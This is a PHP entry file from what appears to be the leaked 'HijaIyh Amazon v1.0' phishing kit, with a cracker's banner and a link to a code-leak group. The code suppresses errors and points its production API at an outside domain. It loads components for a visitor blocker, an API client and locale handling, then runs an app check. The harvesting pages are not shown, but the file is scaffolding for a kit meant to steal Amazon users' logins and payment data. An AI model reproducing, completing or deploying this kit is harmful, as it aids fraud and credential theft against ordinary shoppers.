<?php
/*
    ▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
    ██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
    ██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
    ▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
    .▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀
    FuCked By [!]DNThirTeen
    https://www.facebook.com/groups/L34K.C0de/
*/
error_reporting(0);
# HijaIyh Project.
/**
* HijaIyh Amazon v1.0
* @version 1.0
* @author shutdown57 < indonesianpeople.shutdown57@gmail.com >
* @copyright (c) HijaIyh Production 2019.
**/

$version = '1.0';

define('mode','production');

switch (mode) {
	case 'development':
		@error_reporting(-1);
		@ini_set('display_errors', 1);
		$API_URL = "http://localhost/hpanel";
		break;
	case 'production':
	/*	@ini_set('display_errors', 0);
		if (version_compare(PHP_VERSION, '5.3', '>='))
		{
			error_reporting(E_ALL & ~E_NOTICE & ~E_DEPRECATED & ~E_STRICT & ~E_USER_NOTICE & ~E_USER_DEPRECATED);
		}
		else
		{
			error_reporting(E_ALL & ~E_NOTICE & ~E_STRICT & ~E_USER_NOTICE);
		}*/
		$API_URL = "http://sherlinputri.com";
		break;
	default:
		exit('Mode not found ');
		break;
}


@session_start();
set_time_limit(0);




spl_autoload_register(function($class)
{
	require_once(__DIR__.'/HijaIyh_App/class/'.$class.'.iyh.php');
});
 
$core = new hicore;
$api = new hiapi(/*$API_URL,@file_get_contents(__DIR__.'/HijaIyh_App/config/.account_key'),@file_get_contents(__DIR__.'/HijaIyh_App/config/.api_key')*/);
$locales = new hilocale;
$blocker = new hiblocker;
//print_r($api);

require_once(__DIR__.'/HijaIyh_App/AppCheck.php');
